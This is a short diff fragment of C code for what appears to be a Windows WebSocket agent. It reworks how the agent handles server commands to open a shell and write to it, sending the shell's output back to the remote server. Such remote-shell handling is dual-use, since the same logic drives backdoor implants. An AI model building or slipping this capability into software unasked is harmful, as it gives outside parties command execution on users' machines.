@@ -463,10 +463,16 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             goto cleanup;               /* spec: terminate immediately  */
         }
 
-        if (opcode == CMD_HELLO && msg.length == 1) {
-            err = handle_hello(socket);
-        } else if (opcode == CMD_OPEN_SHELL) {
-            err = handle_open_shell(socket);
+        unsigned char reply[4 + SHELL_READ_CHUNK + 1];
+        DWORD reply_len = 0;
+        // if (opcode == CMD_HELLO) {
+        //     err = handle_hello(ctx, reply, &reply_len);
+        //     if (err == NO_ERROR)
+        //         err = ws_send(ctx->winhttp, socket, reply, reply_len);
+         if (opcode == CMD_OPEN_SHELL) {
+            err = handle_open_shell(ctx, reply, &reply_len);
+            if (err == NO_ERROR || err == STATUS_ERROR)
+                err = ws_send(ctx->winhttp, socket, reply, reply_len);
         } else if (opcode == CMD_WRITE_SHELL && msg.length >= 9) {
             err = handle_write_shell(ctx, &msg, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
